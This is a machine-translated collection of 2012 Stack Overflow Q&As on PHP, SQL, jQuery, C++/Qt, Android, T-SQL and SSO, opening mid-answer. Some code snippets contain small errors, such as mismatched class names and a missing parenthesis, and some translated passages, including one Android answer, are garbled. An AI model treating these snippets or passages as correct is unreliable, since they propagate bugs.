更多地了解您打算如何使用它会有所帮助，但我会试一试：您可以通过分离叶节点和复合节点来表示复杂的逻辑条件。叶节点将表示可以基于非递归处理评估为真/假的事物，而复合节点会将评估委托给它们的子节点，然后应用一些函数来得出最终值。

例如，考虑这种设计：

```
abstract class Node
{
public abstract function eval();
}

class EqualNode extends Node
{
protected $aValue;
protected $bValue;

public function __construct($a, $b)
{
$this->aValue = $a;
$this->bValue = $b;
}

public function eval()
{
return $this->aValue == $this->bValue;
}
}

public class AndNode extends Node
{
protected $leftNode;
protected $rightNode;

public function __construct($left, $right)
{
$this->leftNode = $left;
$this->rightNode = $right;
}

public function eval()
{
return $this->leftNode->eval() && $this->rightNode->eval();
}
} 
```

然后你可以像这样创建一个新的逻辑表达式：

```
$exp1 = new EqualNode(2,2);
$exp2 = new EqualNode('Hi','Bye');
$exp3 = new And($exp1, $exp2);
$exp3->eval(); 
```

一些值得注意的事情：

*   这只是[复合](http://www.oodesign.com/composite-pattern.html)模式的一个实现。查看它以更好地了解它的工作原理。
*   这个设计只是一个例子。您可以通过使用子节点的集合（例如广义与）将其具有一元运算符（例如 NOT）、更多二元运算符（AND、OR）或 N-ary
*   抽象`Node`类可以是一个接口，因此您可以避免强制新节点成为特定层次结构的兄弟节点。
*   我不知道您使用它的上下文，但[命令](http://www.oodesign.com/command-pattern.html)模式也可能会给您一些有趣的想法。

高温高压

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-04T13:40:41.930

您的表达式形成一棵树，因此直接表示将是定义一个抽象表达式类来表示树的节点，并为每个操作定义具体的子类，例如

```
public abstract class Expr<T>
{
    public abstract T Eval();
}

public class Eq : Expr<bool>
{
    private Expr<int> left;
    private Expr<int> right;
    public Eq(Expr<int> left, Expr<int> right)
    {
        this.left = left;
        this.right = right;
    }

    public override bool Eval()
    {
        return this.left.Eval() == this.right.Eval();
    }
} 
```

这将用于评估的逻辑放在节点中。这使得添加新节点类型变得简单，因为您可以简单地定义一个新的`Expr<T>`.

另一种方法是使用[访问者模式](http://en.wikipedia.org/wiki/Visitor_pattern)将解释节点的逻辑放入打开节点类型的外部访问者中。

# sql - 我的查询有错误吗？

> ID：13703965
> 
> 赞同：-2
> 
> 时间：2012-12-04T13:24:02.420
> 
> 标签：sql, sqlite

我在 iOS 的 SQLite 中进行查询，有时它返回 0 行。它有什么错误吗？

```
SELECT mcon.MessageDictKey, 
       mcon.EMail, 
       con.Name, 
       con.ShowOnLists, 
       mcon.ContactType
  FROM MessageContacts AS mcon
  LEFT JOIN Contacts AS con ON mcon.EMail=con.EMail 
 WHERE mcon.MessageDictKey='5-131' 
   AND mcon.ContactType=0 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-04T13:31:49.330

我相信你的查询是相反的。我相信您想从 Contacts 和 LEFT JOIN 到 MessageContacts 中选择什么。即使他们没有任何消息，您也总是希望联系人回来。您的查询是说“我总是想要消息，即使他们没有联系人”，这是倒退的。

```
SELECT mcon.MessageDictKey, 
       mcon.EMail, 
       con.Name, 
       con.ShowOnLists, 
       mcon.ContactType
  FROM Contacts AS con
  LEFT JOIN MessageContacts AS mcon ON mcon.EMail=con.EMail  AND mcon.MessageDictKey='5-131' AND mcon.ContactType=0 
```

我还将您的 WHERE 子句移至 ON 语句。把它放在 WHERE 基本上会导致 LEFT JOIN 像 INNER JOIN 一样（因为不匹配的记录将被强制有一个值来传递你的 WHERE 子句）。

如果这不是您想要的，请告诉我，我将删除我的答案。我无法在评论中准确传达所有这些信息，因此我将其作为答案提交。

# jquery - jquery删除类在chrome中不起作用

> ID：13703966
> 
> 赞同：0
> 
> 时间：2012-12-04T13:24:04.997
> 
> 标签：jquery, google-chrome, addclass, scrolltop, removeclass

此代码在 Firefox 中有效，但在 Chrome v.23 中无效。当我在调试器中跟踪代码时，一切正常，但**Chrome 没有更改 class**。有任何想法吗？

```
$(document).scroll(function () {

    $('a.nav').each(function () {

        var divTop = $('#' + this.title).offset().top;
        var distance = divTop - $("html").scrollTop();
        if (distance > 210 && distance < 255) {

            $('a.active').removeClass('active');
            $(this).addClass('active');

        }
    });
}); 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-04T13:36:12.440

问题是针对滚动顶部的 $("html") 。

请参阅此 SO 线程：[jQuery scrollTop() 在 Safari 或 Chrome (Windows) 中似乎不起作用](https://stackoverflow.com/questions/1830080/jquery-scrolltop-doesnt-seem-to-work-in-safari-or-chrome-windows)

有关您的场景实际发生的情况的详细信息，请参阅第二个答案，即尝试使用 $('body')

不过，前两个解决方案中的任何一个都应该适合您。

# cmd - 更改日期将其添加到文件中

> ID：13703969
> 
> 赞同：1
> 
> 时间：2012-12-04T13:24:12.483
> 
> 标签：cmd

我有一个批处理文件，它每天都会向 csv 文件添加一个文本行（见下文）。在该行中有一个日期，该日期必须每天更改，并且必须是昨天的日期。星期一必须是星期五的日期。日期更改完成后，必须在文件中添加该行。

我不知道该怎么做，我知道有突击队可以更改日期。我在互联网和这个论坛上搜索过，但我找不到。希望一些机构可以帮助我。

对于 (C:\blp\bbdl_csv\dailycurrency1.out.????????.csv) 中的 %%j，请执行 @echo。”EUR CMPN 货币|0|4|EUR|12/03/2012|复合(纽约)|1.000000|">> %%j

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-02T15:51:08.727

我会使用另一种语言的日期库来计算日期。

处理日期很难正确。例如，如果在周末运行会发生什么？

这是python中的一个例子。

```
import datetime

def previous_workday(date):
    day_name = date.strftime('%A')
    days_offset = 3 if day_name == 'Monday' else 1
    previous_workday = date - datetime.timedelta(days=days_offset)
    return previous_workday.strftime('%m/%d/%Y')

print(previous_workday(datetime.date.today())) 
```

有带有日期功能的批处理库。

*   [http://www.commandline.co.uk/cmdfuncs/dandt/index.html](http://www.commandline.co.uk/cmdfuncs/dandt/index.html)
*   [http://www.robvanderwoude.com/datetiment.php#Yesterday](http://www.robvanderwoude.com/datetiment.php#Yesterday)

但是它们很难控制。

# c++ - 哨兵 QWidget 是个好主意（在创建和填充布局时防止内存泄漏）？

> ID：13703970
> 
> 赞同：1
> 
> 时间：2012-12-04T13:24:13.100
> 
> 标签：c++, qt, qwidget, raii

这段取自[http://doc.qt.digia.com/qt/qhboxlayout.html#details](http://doc.qt.digia.com/qt/qhboxlayout.html#details)的代码片段，除了一些我不知道的魔法之外，充满了潜在的内存泄漏。

编辑：感谢 Nikos C. 指出异常安全在 Qt 中很奇怪，如下所示：http: [//doc.qt.digia.com/qt/exceptionsafety.html](http://doc.qt.digia.com/qt/exceptionsafety.html)因此，为了保持我的问题的主要意图有效，我更新了示例代码：

```
 QWidget *window = new QWidget;
 QPushButton *button1 = new QPushButton("One");
 QPushButton *button2 = new QPushButton("Two");
 QPushButton *button3 = new QPushButton("Three");
 QPushButton *button4 = new QPushButton("Four");
 QPushButton *button5 = new QPushButton("Five");

 QMyWidgetThatCanThrow *myWidget = new QMyWidgetThatCanThrow("");

 QHBoxLayout *layout = new QHBoxLayout;
 layout->addWidget(button1);
 layout->addWidget(button2);
 layout->addWidget(button3);
 layout->addWidget(button4);
 layout->addWidget(button5);
 layout->addWidget(myWidget);

 window->setLayout(layout);
 window->show(); 
```

只有在最后才将小部件重新分配给窗口，因此最后两行之前的任何异常都会泄漏所有内容（假设在实际代码中窗口具有父级）。

在类似的非 Qt 代码中，我会使用哨兵对象来处理这种事情。是否有在这里使用哨兵的最佳实践方法，其他人在查看我的代码时会理解？

编辑：这会是可接受的设计模式吗？

```
void PopulateWindow(QWidget *window)
{
     QWidget sentry;    //serves as the intial parent ensuring that all
                        //widgets are either reparented or deleted
     QPushButton *button1 = new QPushButton("One",&sentry);
     QPushButton *button2 = new QPushButton("Two",&sentry);
     QPushButton *button3 = new QPushButton("Three",&sentry);
     QPushButton *button4 = new QPushButton("Four",&sentry);
     QPushButton *button5 = new QPushButton("Five",&sentry);

     QHBoxLayout *layout = new QHBoxLayout(&sentry);
     layout->addWidget(button1);
     layout->addWidget(button2);
     layout->addWidget(button3);
     layout->addWidget(button4);
     layout->addWidget(button5);

     window->setLayout(layout);
}    //sentry goes out of scope and deletes anything that was not reparented 
```

使用它：

```
 QWidget *window = new QWidget;
 PopulateWindow(window);
 window->show(); 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-04T13:41:14.273

会出什么问题？你想避免什么问题？如果您创建小部件并且有任何东西迫使您中止，请像在常规 C/C++ 中那样做

```
if(huhOh!!){
   delete button1;
   delete button2;
   ....
   return false
} 
```

编辑：

没有什么能阻止你做

```
void PopulateWindow(QWidget *window){

 QPushButton *button1 = new QPushButton("One",window);
 QPushButton *button2 = new QPushButton("Two",window);
 QPushButton *button3 = new QPushButton("Three",window);
 QPushButton *button4 = new QPushButton("Four",window);
 QPushButton *button5 = new QPushButton("Five",window);

 QHBoxLayout *layout = new QHBoxLayout(window);
 layout->addWidget(button1);
 layout->addWidget(button2);
 layout->addWidget(button3);
 layout->addWidget(button4);
 layout->addWidget(button5);

 //layout already set
 //window->setLayout(layout);
} 
```

在这种情况下，您只需删除`window`

# jquery - 增加对 $.each 的理解 - 不要在每次迭代时附加 DOM

> ID：13703972
> 
> 赞同：0
> 
> 时间：2012-12-04T13:24:20.173
> 
> 标签：jquery

我正在过滤一组对象，并且对于数组中的每次迭代，我都使用一个模板并将其替换为我们当前所在对象的唯一信息（属性）。然后将模板附加到 DOM。

请查看第一个代码块并注意代码行在迭代器函数`$('body').append(temp);`内部`$.each`

我特别有兴趣了解 -

1.  是因为我在迭代器函数`$('body').append(temp);`内部留下了 DOM 将被附加到每次迭代中吗？`$.each`

2.  如果数组中有一个包含 50 个项目的列表怎么办？在那种情况下，对于每次迭代，我们是否都在 DOM 中添加了一些东西？

**代码**

```
(function() {

        var content = [
            {
                title: "Speak of the devil and he shall appear",   
                thumbnail: 'images/bane.jpg',
            },
            {
                title: 'Me the joker',   
                thumbnail: 'images/Joker.jpg',
            },
        ];

             var template = $.trim( $('#blogTemplate').html() );

        $.each( content, function( index, obj ) { $(content).each(function() {})
            var temp =  
                    template.replace( /{{title}}/ig, obj.title )
                            .replace( /{{thumbnail}}/ig, obj.thumbnail );
            console.log(temp);

            $('body').append(temp);
        });

    })(); 
```

为了解决这个问题，我认为最好先建立一个字符串，然后将该字符串只扔到 DOM 中一次。所以我创建了一个名为 frag 的新变量并将其设置为一个空字符串。然后我们将通过对象数组进行过滤，并且对于数组中的每个对象，而不是附加到我们将要说的 DOM`frag+=`后面是堆叠的`.replace`方法。

```
var template = $.trim( $('#blogTemplate').html() );
        var frag = '';

    $.each( content, function( index, obj ) { 
        frag +=     
                template.replace( /{{title}}/ig, obj.title )
                        .replace( /{{thumbnail}}/ig, obj.thumbnail );
        console.log(frag);
    });

    $('body').append(frag);

})(); 
```

当我们完成后，我们可以说`$('body').append(frag);`在`$.each`迭代器函数之外。

这让我想到了最后一个问题：

3a。我已经`$('body').append(temp);`退出了该`$.each`函数，这样做是否阻止了在 $.each 函数的每次迭代中更新 DOM？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-04T13:48:25.087

你的问题的答案

1.  是的，如果您在 each 块内进行附加，则 dom 将在每次迭代时附加
2.  是的，对于数组上的 50 个项目中的每一个，您都将操纵 DOM
3.  是的，通过在每个块之外进行附加，您只操作 DOM 一次。

编辑：另外，如果您想将附加内容留在每个块中，您应该首先从 DOM 中删除容器元素，对其进行操作，然后将其附加回 DOM

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-04T13:45:57.293

1.  是的，2\. 是的，3\. 是的 - 所有三个问题都符合您的预期。

# c++ - 指向具有不同参数的成员函数的指针的容器

> ID：13703980
> 
> 赞同：0
> 
> 时间：2012-12-04T13:24:55.930
> 
> 标签：c++, templates, callback, scheduling, generic-programming

我到处寻找（现代 C++ 设计和合作），但我找不到一种很好的方法来存储一组接受不同参数并在不同类上操作的回调。我需要这个，因为我希望我的应用程序的每个对象都有可能将其方法之一的执行推迟到一个主`Clock`对象，该对象跟踪当前时间，可以在正确的时刻调用这个方法。我的目标是这样的代码：

在 的`void executeAction1Deferred(int time, int arg1, bool arg2)`方法中`class1`，time 是未来想要的执行时间，应该是这样的：

```
Clock::defer(time, Class1::action1, this, arg1, arg2); 
```

在`Clock::defer(??? what signature ????)`表示此任务的对象中，存储在优先级队列中，其中时间是 Key。对于每个`Clock`量程，然后遍历任务列表，并执行需要在此量程中运行的任务。请注意，我使用“defer”作为静态函数，因为我打算`Clock`使用单例对象，但它也可以是成员函数，这只是选择问题。

我曾想过使用`void*`来保留可变数量的参数，但是让我的`action1()`方法接受 a`void*`是非常糟糕的，因为每次我直接使用这个函数而不推迟它时，我都需要为参数制作一个结构。

我过去多次面临这个问题，但我从来没有找到一个真正体面的解决方案。请注意，作为一个小型多平台项目，对于没有经验的程序员可以扩展它的简单性是必不可少的，我不想使用 boost。但是，我们处理的平台的每个编译器都有`std::tr1`绑定。问题是：如何定义一个泛型函数的容器，每个函数都接受可变数量的参数（最多 N ~ 5 个），并且是不从公共虚拟类派生的对象的不同成员方法？谢谢

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-12-04T13:32:16.593

用于`std::function<void()>`存储调用，然后使用可变参数模板参数来转发和绑定函数参数：

```
class Clock
{
    vector<function<void()>> tasks;

    template<class F, class... Args>
    void defer(F f, Args&&... args)
    {
        tasks.push_back(bind(f, forward<Args>(args)...);
    }

}

void f(A a, B b);

int main()
{
    A a;
    B b;

    Clock c;
    c.push_back(f, a, b);
} 
```

另见`std::bind`和`std::mem_fun`

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-12-04T13:38:04.660

在 C++11 中，存储`std::function<void()>`. 您可以使用`std::bind`从不同签名之一创建函数，例如：

```
std::vector<std::function<void()>> deferred;
deferred.push_back(std::bind(&Class1::action1, this, arg1, arg2));

// later...
for (auto f : deferred) f(); 
```

如果 C++11 不是一个选项，那么 Boost 具有非常相似`function`的`bind`模板。我认为它们可能也存在于 TR1 中，尽管我没有任何历史参考资料可供检查。

如果 Boost 真的不是一个选项（并且 TR1 没有提供这些），那么我强烈建议您将其作为一个选项；否则，使用 Boost 作为如何实现它的示例。如果没有可变参数模板，它会变得非常多毛。

（既然您提到了现代 C++ 设计，请阅读类型列表部分；这就是您在没有可变参数模板的情况下如何做到的）。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-12-04T13:38:24.380

由于您的回调被延迟，包括它们提供的参数，*真正的*签名将是`void()`，即 Clock 对象不会自己提供参数，也不需要评估结果。因此，通常您会希望将成员函数指针（或其他函数指针）与所需的参数绑定在一起，并将结果（函数对象）传递给时钟。这是`boost::bind`/`std::tr1::bind`和`boost::function`/`std::function<void()>`出现的地方 - 或 C++11 lambda：

```
Clock::defer(time, boost::bind(&Class1::action1, this, arg1, arg2));
//C++11 lambda:
Clock::defer(time, [=](){action1(arg1, arg2);} ); 
```

但是你所做的已经完成了 - 看看 Boost.Asio 计时器：

```
boost::asio::basic_deadline_timer timer(ioService, expiryTime);
timer.async_wait([=](){action1(arg1, arg2);} //perform action1 when the timer is done 
```

# android - 以编程方式从 Google Play 商店下载 APK

> ID：13703982
> 
> 赞同：8
> 
> 时间：2012-12-04T13:24:58.050
> 
> 标签：android, android-install-apk

我正在创建一个依赖于其他一些 android 应用程序的 android 应用程序。因此，如果用户移动设备上还没有这些依赖应用程序，我想以编程方式从 Play 商店下载它们。但在此过程中，我不希望控件转到 Play 商店应用程序（即不应显示任何 Play 商店应用程序活动）。是否可以使用某些服务、谷歌 API 来实现这一点？我该如何实施呢？我尝试了市场 api 并且它工作但现在在安装时我收到“未知来源”弹出。有没有可能摆脱这种形式？从 Play 商店应用程序和市场 api 下载的 apk 有什么区别？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-12-04T13:27:14.567

有一个非官方的[市场 API](http://code.google.com/p/android-market-api/)：[这](http://code.google.com/p/android-market-api/wiki/HowDownloadApps)就是您可以使用它下载应用程序的方式。

# php - Joomla！SOBI2 编辑列表类别

> ID：13703987
> 
> 赞同：1
> 
> 时间：2012-12-04T13:25:14.613
> 
> 标签：php, joomla

要编辑哪个文件（php，而不是 css）来更改类别列表？？？ ![截屏](../Images/8e022b6351ce103cdc9bbb1762a15064.png)

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-05T23:27:34.830

它们不是在数据库中吗？您不是通过进入站点的 /administrator/ 区域中的“组件”->“SOBI”并编辑类别来编辑它们吗？

# magento - Magento 导入或导出产品值而不是其标签

> ID：13703988
> 
> 赞同：2
> 
> 时间：2012-12-04T13:25:14.243
> 
> 标签：magento

如何导入和导出产品值而不是其标签。从 Magento 导入导出产品时，使用的是属性标签，而不是值。

The colour attribute is an example of this behaviour, when selecting the colour attribute for a product, the drop down contains labels, strings of colour names eg "red", "blue" etc, but the values are integers, eg 26, 25 etc . 导出产品时，CSV 列表中的颜色字段包含字符串值，而不是整数。并且在导入产品时，Magento 期望颜色字段包含一个字符串，而不是一个整数。

是否有一个可以覆盖的类，以便我可以更改特定属性的行为，让我可以控制为某个特定属性导入或导出哪些数据。该属性不是标准的 Magento 属性，而是我自己添加的。

谢谢

# sql-server - T-SQL。过程调用文本

> ID：13703991
> 
> 赞同：9
> 
> 时间：2012-12-04T13:25:29.110
> 
> 标签：sql-server, tsql, logging, stored-procedures

我正在尝试为我的存储过程实现通用日志记录。我发现的最佳解决方案是使用 DBCC INPUTBUFFER，它返回过程调用的文本，如：

```
DECLARE @a INT
SET @a = 1000
EXEC usp_Test @param = @a 
```

但它有一个限制，这个缓冲区的最大长度是 4000。我有很多具有表值参数的过程，而且它们通常包含 > 10000 条记录，所以我不能用这种方法记录这个调用。

有没有办法在每个过程中不手动创建“过程调用文本”的情况下实现这种日志记录？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-12-04T13:59:59.597

`DBCC INPUTBUFFER @SPID`您可以尝试使用[dm_exec_sql_text](http://msdn.microsoft.com/en-us/library/ms181929.aspx)而不是using

它有一个`nvarchar(max)`截至`Text`最后一个 SP 的字段。

尝试为此代码构建一个函数（期望`@SPID`as int 参数）：

```
--Select the sql_handle first for the given session ID
DECLARE @sqltext VARBINARY(128)
SELECT @sqltext = sql_handle
FROM sys.sysprocesses
WHERE spid = @SPID

--Select the last statement
SELECT TEXT
FROM sys.dm_exec_sql_text(@sqltext) 
```

另一种使用方式：

```
EXEC yourProcedure withYourParams
SELECT @sqltext = sql_handle FROM sys.sysprocesses WHERE spid = @@SPID

SELECT TEXT FROM ::fn_get_sql(@sqltext) 
```

代替`@SPID`参数，您可以使用 `@@SPID`, 但是此代码段将与您的最后一个 SP 调用集成。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-12T04:56:26.337

变更数据捕获呢？

[http://msdn.microsoft.com/en-us/library/bb510744(v=sql.105).aspx](http://msdn.microsoft.com/en-us/library/bb510744(v=sql.105).aspx)

或 OUTPUT 语句

[http://msdn.microsoft.com/en-us/library/ms177564.aspx](http://msdn.microsoft.com/en-us/library/ms177564.aspx)

# java - 是否可以将 OpenID/oAuth 作为 SSO 用于单个域上的不同平台？

> ID：13703993
> 
> 赞同：0
> 
> 时间：2012-12-04T13:25:35.897
> 
> 标签：java, php, openid, oauth-2.0, single-sign-on

就我而言，我有四个平台。

2 个平台在 PHP 中，2 个平台在 JAVA 中，位于单个域上。

喜欢

```
www.example.com/login.php (Main page to login in platform) 
```

如果用户登录，则允许他无需登录即可访问此平台的任何内容。

```
www.example.com/php1 
www.example.com/php2
www.example.com/java1
www.example.com/java2 
```

我想要的是对所有平台使用通用登录。在我的情况下，我无法共享会话，因为两个平台都有不同的服务器（Apache，JBOSS）

在这种情况下可以使用 OpenID 吗？如果是，如何？在这种情况下，还有可能使用 oAuth 吗？

如果以上都不适合我的情况，还有其他想法吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-07T04:40:27.620

如果针对同一商店进行身份验证，则平台并不重要。所以让你的所有应用程序都使用相同的 LDAP、数据库、服务等进行身份验证......

看看[OpenID 中的存储概念是什么](https://stackoverflow.com/questions/3937456/what-is-the-concept-of-store-in-openid)

* * *

可以使用 OpenID。
也可以使用 OAuth。

尽管可以使用 OAuth 进行身份验证，但 OAuth 更多的是关于授权。 [来自 OAuth 维基百科文章的](http://en.wikipedia.org/wiki/OAuth)

> OAuth 是一种与 OpenID 互补的服务，因此也不同于 OpenID。

* * *

有关如何在 Java/PHP 中使用 OpenID 和/或 OAuth，请查看 OpenID 和 OAuth 库的文档，例如：

*   [openid4java](http://code.google.com/p/openid4java/)
*   [OpenID - 梨](http://pear.php.net/package/OpenID/redirected)

还要检查服务提供商的文档。

# hex - 在 Notepad++ 中移动文本/数据

> ID：13703996
> 
> 赞同：2
> 
> 时间：2012-12-04T13:25:49.920
> 
> 标签：hex, notepad++, timecodes

我什至不知道这是否可能。我对记事本++还是很陌生

我正在尝试对一些捕获的数据进行排序，以便导入我创建的 Excel 文档。我选择的时间码卡在数据包中间有问题。所以我有

```
(DA)TIME(TA) - time in the middle of data 
```

我已经将令人难以置信的长字符串分类为数据包，并通过使用逗号将时间码与数据分开，因此它现在显示为：

```
Some Data, Timecode, Rest of Data 
```

是否有任何命令或方法可以将逗号之间的数据移动到行首？- 或者结束但开始会更好。我浏览了 Notepad++ 和其他各种站点中的“帮助”部分，但找不到任何可以给出直接答案的东西。

如果时间码是恒定的，但作为时间码，它会在每个捕获点增加 1 或 2，这将很容易。我还统一格式化了时间码（matlab 格式最后缺少 0，所以它们现在都是 123456.123456 格式，而不是 123456.12345）。

可以做到吗？如果可以，怎么做。我也有程序员记事本，但更喜欢记事本++

提前致谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-11T02:08:09.027

如果有人必须在记事本++中执行此操作...

一些数据，一些数据，123456.123456，其余数据，其余数据

```
Find   :(^.*,) ([0-9]*.[0-9]*,)(.*$)
Replace:\2 \1\3 
```

123456.123456，一些数据，一些数据，其余数据，其余数据

# android - 仅限客户端的 Android 推送通知

> ID：13703997
> 
> 赞同：0
> 
> 时间：2012-12-04T13:26:00.040
> 
> 标签：android, calendar, push-notification, push

我正在尝试在不使用服务器的情况下构建一个 android 应用程序（即客户端中的硬编码逻辑并使用客户端中的数据库来保存和操作用户输入）。是否仍然可以在不使用服务器或云的情况下发送推送通知并利用本机 android 日历应用程序？主要使用Android SDK和SQLite，是否有可能根据事件触发器编写逻辑并发送通知并将时间线与本机日历同步？

更简单的解决方案将不胜感激，因为这里没有很多编程经验..

非常感谢，

塞西莉亚

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-04T13:35:20.960

> 是否仍然可以在不使用服务器或云的情况下发送推送通知并利用本机 android 日历应用程序？

不，因为根据定义，如果您没有“服务器或云”，则没有什么可以“发送推送通知”。

如果“推送通知”不是指“推送通知”，而是“按计划进行工作”，请使用`AlarmManager`.

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-04T13:35:31.133

我不明白，但我的英语不是很好

你知道有PhoneGap之类的系统或者更多的这些系统之前我的yapdığım有一个方法集中我的WebView页面是从html代码读取和加载方法、控制等。我不知道我知道我会使用事务。

它以不同于你所知道的方式使用 Web 服务，能够记录这些事务 ta sqlite

有一个与 la datetimepicker 相关的话题

[如何创建这样的日期选择器？](https://stackoverflow.com/questions/10460530/how-to-create-a-datepicker-like-this#comment15004572_10460530)